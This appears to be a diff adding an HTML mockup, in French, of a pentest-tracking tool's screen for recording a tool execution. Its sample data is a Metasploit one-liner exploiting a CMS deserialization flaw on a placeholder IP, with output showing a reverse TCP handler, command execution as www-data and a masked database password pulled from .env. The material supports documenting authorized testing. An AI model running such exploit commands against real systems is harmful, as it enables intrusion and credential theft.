@@ -1,0 +1,74 @@
+<!doctype html>
+<!--
+	Maquette 07 (15.01) : exécution d'outil. Métadonnées en clair, commande et
+	sortie chiffrées puis déchiffrées dans le navigateur, colorées par PrismJS,
+	sortie tronquée au-delà de la taille paramétrée, liens vers tâches et cibles.
+	Sources : 11.08 (outils, exécution, confidentialité, affichage).
+-->
+<html lang="fr">
+<head>
+	<meta charset="utf-8">
+	<title>07 Exécution d'outil — maquette</title>
+	<link rel="stylesheet" href="maquettes.css">
+	<script src="maquettes.js"></script>
+</head>
+<body data-nav="tests" data-section="executions" data-ecran="07">
+<main>
+	<div class="actions">
+		<h3>EXE-017 — Metasploit 6.4.12</h3>
+		<span class="badge b-outline">Saisie</span>
+		<span class="spacer"></span>
+		<button type="button" class="secondary"><i class="i" data-i="download"></i>Télécharger (déchiffré)</button>
+		<button type="button"><i class="i" data-i="edit"></i>Modifier</button>
+	</div>
+
+	<div class="grid-2" style="grid-template-columns: 1fr 44ch">
+		<div style="display:flex; flex-direction:column; gap:1lh">
+			<fieldset>
+				<legend>Commande <small>bash</small> <span class="callout">1</span></legend>
+<pre class="code"><span class="tok-cmd">msfconsole</span> <span class="tok-opt">-q -x</span> <span class="tok-str">"use exploit/multi/http/cms_preview_deser;
+  set RHOSTS 203.0.113.10; set RPORT 443; set SSL true;
+  set CMD 'id; hostname'; run; exit"</span></pre>
+			</fieldset>
+			<fieldset>
+				<legend>Sortie <small>texte brut</small></legend>
+<pre class="code"><span class="tok-com">[*] Started reverse TCP handler on 198.51.100.7:4444</span>
+<span class="tok-com">[*] Running automatic check ("set AutoCheck false" to disable)</span>
+[<span class="tok-str">+</span>] The target appears to be vulnerable. Version <span class="tok-num">4.2.0</span> detected.
+[<span class="tok-str">*</span>] Sending serialized payload (<span class="tok-num">1 482</span> bytes)
+uid=<span class="tok-num">33</span>(www-data) gid=<span class="tok-num">33</span>(www-data) groups=<span class="tok-num">33</span>(www-data)
+srv-web01
+[<span class="tok-str">*</span>] Command execution completed
+<span class="tok-key">DB_PASSWORD</span>=●●●●●●●● <span class="tok-com"># extrait de .env, masqué ici par le testeur</span></pre>
+				<small><i class="i" data-i="info"></i> Sortie de 2,4 Mio : 1 Mio affiché <span class="callout">2</span> — <a href="#">télécharger le texte complet</a>.</small>
+			</fieldset>
+			<div class="note"><i class="i" data-i="lock"></i> Commande et sortie forment un seul contenu chiffré dans le navigateur (trousseau : équipe du test). La recherche et l'historique ne portent que sur les métadonnées.</div>
+		</div>
+
+		<div style="display:flex; flex-direction:column; gap:1lh">
+			<fieldset>
+				<legend>Métadonnées <small>en clair</small></legend>
+				<dl>
+					<dt>Outil</dt><dd>Metasploit <a href="#">catalogue</a></dd>
+					<dt>Version</dt><dd>6.4.12 <small>(dernière saisie)</small></dd>
+					<dt>Auteur</dt><dd>Sam Leroy</dd>
+					<dt>Début</dt><dd>3 déc. 10:22:05</dd>
+					<dt>Fin</dt><dd>3 déc. 10:23:41</dd>
+					<dt>Phase</dt><dd>3. Exploitation</dd>
+					<dt>Origine</dt><dd>Saisie</dd>
+				</dl>
+			</fieldset>
+			<fieldset>
+				<legend>Liens <span class="callout">3</span></legend>
+				<dl>
+					<dt><i class="i" data-i="tasks"></i> Tâches</dt><dd><a href="#">T-029</a></dd>
+					<dt><i class="i" data-i="server"></i> Cibles</dt><dd><a href="#">srv-web01</a> 203.0.113.10</dd>
+					<dt><i class="i" data-i="bug"></i> Révèle</dt><dd><a href="#">VULN-003</a> <span class="badge b-red">Critique 9,8</span></dd>
+				</dl>
+				<div class="actions"><button type="button" class="small secondary"><i class="i" data-i="link"></i>Lier…</button></div>
+			</fieldset>
+		</div>
+	</div>
+</main>
+</body>
+</html>
